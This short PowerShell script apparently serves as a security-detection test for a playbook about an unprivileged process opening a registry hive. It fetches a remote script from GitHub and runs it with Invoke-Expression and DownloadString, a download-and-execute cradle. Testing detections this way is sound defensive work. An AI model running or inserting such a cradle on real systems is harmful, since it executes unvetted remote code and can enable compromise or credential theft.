# Disclaimer: This script is for educational purposes only and must be executed in a secure, isolated lab environment.
# Do not execute it in production or on-premises environments under any circumstances.

# Define the URL where the external script is hosted
# This example URL points to a remote script. Make sure you understand the implications of downloading and executing remote scripts.
$url = "https://raw.githubusercontent.com/crtx-pub/PlaybooksAutomation/refs/heads/main/Playbooks%20-%20Unprivileged%20process%20opened%20a%20registry%20hive/HKJOGL.ps1"

# Download and execute the external script
# The "iex" command evaluates the downloaded script's content as PowerShell code.
# The "New-Object net.webclient" is used to fetch the script from the URL.
Invoke-Expression((New-Object net.webclient).DownloadString($url))

# Invoke a function or command from the downloaded script
Main-Execute
